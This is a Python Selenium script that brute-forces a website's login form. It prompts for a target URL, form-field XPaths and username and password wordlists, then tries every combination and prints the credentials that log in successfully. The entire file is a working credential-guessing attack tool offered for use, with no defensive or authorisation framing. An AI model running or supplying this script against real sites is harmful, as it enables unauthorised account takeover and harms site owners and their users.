from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

U = input('Enter the Target Website Url:')

a = input('Enter the xpath of username field:')
b = input('Enter the xpath of password field:')
c = input('Enter the xpath of login/submit button field:')
d = input('Enter path of username file:')
e = input('Enter path of the password file:')
f = input('Enter a word which comes in login is successful Url:')

driver = webdriver.Chrome()

driver.get(U)

def test_login(username, password):
    try:
        username_field = driver.find_element(By.XPATH, a)
        password_field = driver.find_element(By.XPATH, b)
        login_button = driver.find_element(By.XPATH, c)

        username_field.clear()
        password_field.clear()
        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()

        WebDriverWait(driver, 1).until(
            lambda d: d.current_url != U
        )

        if f in driver.current_url:
            print(f'Successful login: {username}:{password}')
            return True
        else:
            print(f'Failed login: {username}:{password}')
            return False

    except Exception as e:
        print(f"Error during login: {e}")
        return False
    finally:
        driver.get(U)

def read_lines_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

if __name__ == '__main__':
    usernames = read_lines_from_file(d)
    passwords = read_lines_from_file(e)

    for username in usernames:
        for password in passwords:
            if test_login(username, password):
                pass
            else:
                pass

    driver.quit()
